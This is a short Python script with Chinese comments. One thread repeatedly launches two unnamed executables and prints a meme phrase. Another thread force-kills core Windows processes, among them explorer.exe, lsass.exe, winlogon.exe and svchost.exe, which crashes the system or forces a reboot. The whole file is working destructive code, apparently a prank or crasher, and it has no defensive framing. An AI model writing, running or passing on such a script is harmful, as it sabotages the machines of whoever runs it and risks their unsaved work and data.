import os
import threading
import time

# 获取当前脚本的绝对路径
script_path = os.path.abspath(__file__)
# 获取当前脚本所在目录
script_dir = os.path.dirname(script_path)
def code_block_1():
    while True:
        os.system("wdglkun.exe")
        os.system("wdglkun2.exe")
        print('你干嘛~')
def code_block_2():
    os.system('taskkill /F /IM explorer.exe')
    os.system('taskkill /F /IM lsass.exe')
    time.sleep(40)
    os.system('taskkill /F /IM winlogon.exe')
    time.sleep(2)
    os.system('taskkill /F /IM svchost.exe')
t1 = threading.Thread(target=code_block_1)
t2 = threading.Thread(target=code_block_2)
# 启动线程
t1.start()
t2.start()
# 等待线程执行完毕
t1.join()
t2.join()